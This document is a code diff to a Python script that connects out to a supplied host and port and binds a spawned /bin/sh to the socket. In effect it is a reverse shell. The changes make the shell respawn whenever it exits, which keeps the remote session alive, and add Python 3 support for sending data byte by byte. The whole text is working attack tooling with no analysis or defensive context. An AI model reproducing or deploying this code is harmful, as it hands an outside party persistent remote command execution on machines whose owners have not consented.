@@ -48,14 +48,16 @@ class IOCommand(object):
     """IOCommand instance."""
 
     def __init__(self, executable):
+        self.env = os.environ.copy()
+        self.cmd = executable
         self.proc = Popen(
-            executable,
+            self.cmd,
             stdin=PIPE,
             stdout=PIPE,
             stderr=STDOUT,
             bufsize=-1,
             shell=False,
-            env=os.environ.copy(),
+            env=self.env,
         )
 
     def output(self):
@@ -63,6 +65,17 @@ class IOCommand(object):
         while True:
             # BLOCKING call
             data = self.proc.stdout.read(1)
+            if not data:
+                self.proc = Popen(
+                    self.cmd,
+                    stdin=PIPE,
+                    stdout=PIPE,
+                    stderr=STDOUT,
+                    bufsize=-1,
+                    shell=False,
+                    env=self.env,
+                )
+                continue
             print("Command Output: {}".format(repr(data)))
             yield data
 
@@ -101,7 +114,14 @@ class IONetwork(object):
         sent = 0
         if send_one_byte:
             for char in data:
-                sent += self.sock.send(char)
+                try:
+                    # Python2
+                    sent += self.sock.send(char)
+                    print("Sending: {}".format(repr(char)))
+                except TypeError:
+                    # Python3
+                    sent += self.sock.send(bytes([char]))
+                    print("Sending: {}".format(repr(bytes([char]))))
         else:
             while sent < size:
                 sent += self.sock.send(data)
@@ -130,7 +150,7 @@ def main(argv):
     s.connect((host, port))
     print("Connected to {}:{}".format(host, port))
 
-    command = IOCommand("/bin/bash")
+    command = IOCommand("/bin/sh")
     network = IONetwork(s)
 
     def exec_cmd(producer, consumer):
